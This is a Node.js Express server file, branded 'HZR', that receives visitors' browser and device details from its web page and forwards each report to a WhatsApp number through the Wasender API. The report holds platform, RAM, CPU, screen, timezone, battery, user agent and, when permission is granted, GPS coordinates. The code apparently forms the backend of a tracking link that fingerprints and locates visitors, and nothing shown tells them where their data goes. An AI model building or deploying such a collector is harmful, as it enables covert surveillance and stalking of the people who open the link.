const express = require("express");
const path = require("path");

const app = express();

const PORT = process.env.PORT || 10000;

// ==============================
// CONFIG
// ==============================

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const WHATSAPP_TO = process.env.WHATSAPP_TO;


// ==============================
// MIDDLEWARE
// ==============================

app.use(express.json({
    limit: "100kb"
}));

app.use(express.static(__dirname));


// ==============================
// HOME
// ==============================

app.get("/", (req, res) => {

    res.sendFile(
        path.join(__dirname, "index.html")
    );

});


// ==============================
// RECEIVE DEVICE INFORMATION
// ==============================

app.post("/api/device-info", async (req, res) => {

    try {

        if (!WASENDER_TOKEN) {

            console.error(
                "WASENDER_TOKEN is missing"
            );

            return res.status(500).json({
                success: false,
                error: "Server configuration error"
            });
        }


        if (!WHATSAPP_TO) {

            console.error(
                "WHATSAPP_TO is missing"
            );

            return res.status(500).json({
                success: false,
                error: "Recipient configuration error"
            });
        }


        const data = req.body;


        // ==========================
        // BASIC VALIDATION
        // ==========================

        if (!data || typeof data !== "object") {

            return res.status(400).json({
                success: false,
                error: "Invalid data"
            });
        }


        // ==========================
        // DEVICE DATA
        // ==========================

        const browser =
            data.browser || {};

        const battery =
            data.battery || {};

        const location =
            data.location || {};


        // ==========================
        // LOCATION
        // ==========================

        let locationText =
            "Not available / permission denied";

        if (
            location.permission === "granted" &&
            typeof location.latitude === "number" &&
            typeof location.longitude === "number"
        ) {

            locationText =
                `Latitude: ${location.latitude}\n` +
                `Longitude: ${location.longitude}\n` +
                `Accuracy: ${Math.round(
                    location.accuracy || 0
                )} m`;
        }


        // ==========================
        // BATTERY
        // ==========================

        let batteryText =
            "Not available";

        if (battery.supported === true) {

            batteryText =
                `${battery.level}%`;
        }


        let chargingText =
            "Not available";

        if (battery.supported === true) {

            chargingText =
                battery.charging
                    ? "Yes"
                    : "No";
        }


        // ==========================
        // CREATE WHATSAPP MESSAGE
        // ==========================

        const message =

`╔════════════════════╗
        HZR DEVICE REPORT
╚════════════════════╝

Entry Time:
${data.entryTime || "Unknown"}

────────────────────

Platform:
${browser.platform || "Unknown"}

Language:
${browser.language || "Unknown"}

CPU Cores:
${browser.cpuCores || "Unknown"}

RAM:
${browser.ramGB
    ? browser.ramGB + " GB"
    : "Unknown"}

Screen:
${browser.screen
    ? `${browser.screen.width} × ${browser.screen.height}`
    : "Unknown"}

Pixel Ratio:
${browser.screen?.pixelRatio || "Unknown"}

Timezone:
${browser.timezone || "Unknown"}

Battery:
${batteryText}

Charging:
${chargingText}

────────────────────

Location Permission:
${location.permission || "Unknown"}

Location:
${locationText}

────────────────────

User Agent:
${browser.userAgent || "Unknown"}

────────────────────

HZR
Device Information`;


        // ==========================
        // SEND TO WASENDER
        // ==========================

        const response = await fetch(
            "https://api.wasender.dev/messages/text",
            {
                method: "POST",

                headers: {
                    "Authorization":
                        `Bearer ${WASENDER_TOKEN}`,

                    "Content-Type":
                        "application/json"
                },

                body: JSON.stringify({

                    to: WHATSAPP_TO,

                    body: message

                })
            }
        );


        const result =
            await response.json();


        // ==========================
        // WASENDER ERROR
        // ==========================

        if (!response.ok) {

            console.error(
                "Wasender error:",
                result
            );

            return res.status(502).json({
                success: false,
                error: "WhatsApp delivery failed"
            });
        }


        // ==========================
        // SUCCESS
        // ==========================

        console.log(
            "HZR report sent successfully."
        );


        return res.json({
            success: true
        });


    } catch (error) {

        console.error(
            "Server error:",
            error
        );

        return res.status(500).json({
            success: false,
            error: "Internal server error"
        });
    }

});


// ==============================
// START SERVER
// ==============================

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log(
            `HZR server running on port ${PORT}`
        );

    }
);
